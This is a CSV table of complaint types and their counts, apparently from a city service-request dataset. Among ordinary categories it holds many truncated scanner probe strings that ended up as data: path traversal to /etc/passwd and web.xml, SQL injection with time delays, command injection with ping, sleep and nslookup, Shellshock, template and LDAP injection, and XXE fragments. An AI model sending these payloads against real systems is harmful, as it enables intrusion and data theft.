Complaint Type,Count
Boiler,41
Advocate-Property Value,41
Single Occupancy Bathroom,40
ZTESTINT,37
Tobacco or Non-Tobacco Sale,36
Trans Fat,34
Transfer Station Complaint,32
DEP Highway Condition,29
No Child Left Behind,23
SRDE,22
Internal Code,22
Oil or Gas Spill,22
Interior Demo,21
NORC Complaint,20
SNW,19
Advocate-Commercial Exemptions,19
DEP Sidewalk Condition,19
Advocate-SCRIE/DRIE,18
Wayfinding,17
Special Enforcement,17
STRUCTURAL,16
Fire Alarm - Reinspection,16
Portable Toilet,13
Advocate - Lien,13
DSNY Internal,12
Public Assembly,11
Advocate - RPIE,10
Fire Alarm - New System,9
Advocate-Prop Class Incorrect,9
AGENCY,9
Rangehood,9
Advocate-Business Tax,8
VACANT APARTMENT,8
Outside Building,8
Employee Behavior,7
Standpipe - Mechanical,6
Leaning Bar,6
Building Marshal's Office,6
DSNY Spillage,6
DOF Property - State Rebate,5
Select Message Type...,5
Advocate-UBT,5
General Question,5
DOB Posted Notice or Order,5
SRGOVG,4
../../../../../../../../../...,4
Hazardous Material,4
..\..\..\..\..\..\..\..\..\...,4
Dispatched Taxi Compliment,4
Fire Alarm - Modification,4
Sprinkler - Mechanical,3
Misc. Comments../../../../....,3
Advocate - Levy,2
Homebound Evacuation 4,2
ZSYSTEST,2
MOLD,2
Gas Station Discharge Lines,2
Hazmat Storage/Use,2
Trapping Pigeon,2
Facade Insp Safety Pgm,2
Misc. Comments..\..\..\..\....,2
file:///etc/passwd,2
MSOTHER,1
Misc. Comments&gt;  BCC:bl0...,1
/etc/passwd,1
Misc. Comments&quot;|ping -...,1
/./validate_form.php,1
Misc. Comments&amp;ping -n ...,1
Misc. Commentseowljujfh8,1
Misc. Comments' and (select...,1
Misc. Comments'(select*from...,1
Misc. Comments'+(select loa...,1
Misc. Comments';declare @q ...,1
../../WEB-INF/web.xml,1
Misc. Comments{${sleep(20)}},1
Misc. Comments}}t2v95'/&quo...,1
c:\windows\win.ini Misc. Co...,1
Misc. Comments'+(function()...,1
Misc. Comments'+(select*fro...,1
Asbestos/Garbage Nuisance,1
LEAD,1
Illegal Animal - Sold/Kept,1
../WEB-INF/web.xml,1
qfix4${695*589}lixaf,1
../../../../WEB-INF/web.xml,1
...\.\...\.\...\.\...\.\......,1
(select extractvalue(xmltyp...,1
`sleep 11`,1
Misc. Comments|ping -c 21 1...,1
Misc. Comments|echo 3p7wexz...,1
Misc. Comments69075347' or ...,1
Misc. Comments);declare @q ...,1
Misc. Comments'||(select ex...,1
"Misc. Comments',0)waitfor d...",1
Misc. Comments');declare @q...,1
Misc. Comments' and '7835'=...,1
Misc. Comments',1
Misc. Comments  BCC:a5glxzf...,1
1430*4963,1
...\./...\./...\./...\./......,1
.../....///.../....///.../....,1
&lt;vlv xmlns=&quot;http://...,1
%{4761*8506},1
%c0%ae/%c0%ae/%c0%ae/%c0%ae...,1
%2fetc%2fpasswd,1
Injured Wildlife,1
&lt;odb xmlns:xi=&quot;http...,1
&quot;--&gt;'--&gt;`--&gt;&...,1
Public Assembly - Temporary,1
Meals Home Delivery Required,1
*)(objectClass=*,1
.../...//.../...//.../...//...,1
..././..././..././..././......,1
Open Flame Permit,1
%c0%ae/WEB-INF/web.xml,1
DOF Literature Request,1
Misc. Comments'.sleep(20).',1
() { _; } &gt;_,1
(select load_file('\\\\615h...,1
../../WEB-INF/web.xml;x=,1
@(9313*3464),1
Misc. Comments&amp;nslookup...,1
Misc. Comments'&quot;`0&amp...,1
Misc. Comments88909845' or ...,1
Misc. Comments' and '1618'=...,1
Misc. Commentso0w3r%&gt;xb6...,1
http://g7orz5h9iu2sh6z332rj...,1
nslookup -q=cname nneyfcxgy...,1
yw97y0gi2s,1
{!xmlparser v='&lt;!DOCTYPE...,1
%c0%ae/%c0%ae/%c0%ae/WEB-IN...,1
%{(#dm=@ognl.OgnlContext@DE...,1
%2e%2e%2f%2e%2e%2f%2e%2e%2f...,1
Misc. Comments' and 7702=77...,1
Misc. Comments')waitfor del...,1
Change Collection Schedule,1
Unspecified,1
Misc. Comments'+sleep(20.to...,1
Misc. Comments'|echo y9v6fc...,1
Misc. Comments'|ping -c 21 ...,1
"Misc. Comments,(select*from...",1
Misc. Comments47876391' or ...,1
Misc. Comments52038737' or ...,1
Request Changes - A.S.P.,1
a'a\'b&quot;c&gt;?&gt;%}}%%...,1
bcd9&lt;!--esi--&gt;1ggp&lt...,1
eval(compile('for x in rang...,1
g0oii1s4s5)(objectClass=*,1
../WEB-INF/web.xml;x=,1
Misc. Comments&amp;echo xjd...,1
Advocate-Foreclosure,1
.../Misc. Comments,1
Misc. Comments'+eval(compil...,1
Misc. Comments' waitfor del...,1
Misc. Comments' and 6049=60...,1
Misc. Comments&quot;,1
Misc. Comments%}dt2pq'/&quo...,1
../../../WEB-INF/web.xml;x=,1
.../.\.../.\.../.\.../.\......,1
Fire Alarm - Replacement,1
*)(!(objectClass=*),1
() { :;}; /bin/sleep 11,1
idexf3mrb7)(!(objectClass=*),1
%2e%2e%5c%2e%2e%5c%2e%2e%5c...,1
${3804*3137},1
$(sleep 11),1
Misc. Comments;declare @q v...,1
Misc. Comments]]&gt;&gt;&lt;,1
Misc. Comments|nslookup -q=...,1
\windows\win.ini,1
c:\windows\win.ini,1
file:///c:/windows/win.ini,1
hcvn1{{687*375}}gji51,1
kawn''lcgv,1
DEP Bridge Condition,1
Misc. Comments|ping -n 21 1...,1
SG-99,1
%E5%98%8A%E5%98%8DX-Injecti...,1
%c0%ae/%c0%ae/WEB-INF/web.xml,1
() { :;}; /bin/sleep 0,1
../../../WEB-INF/web.xml,1
./validate_form.php,1
266dyrgvhg1egsyp2oq57axbm2s...,1
Misc. Comments&quot;|echo 2...,1
